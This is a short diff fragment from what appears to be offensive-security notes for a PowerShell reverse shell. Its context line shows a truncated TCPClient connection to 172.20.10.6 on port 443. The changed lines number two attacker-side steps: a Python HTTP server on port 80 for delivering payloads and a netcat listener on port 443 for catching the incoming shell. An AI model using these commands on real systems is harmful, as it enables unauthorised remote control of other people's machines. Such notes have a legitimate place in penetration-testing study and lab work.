@@ -45,8 +45,8 @@ $client = New-Object System.Net.Sockets.TCPClient('172.20.10.6',443);$stream = $
 
 CMD!!
 
-sudo python3 -m http.server 80
-sudo nc -nvlp 443
+1. sudo python3 -m http.server 80
+2. sudo nc -nvlp 443
 
 
 
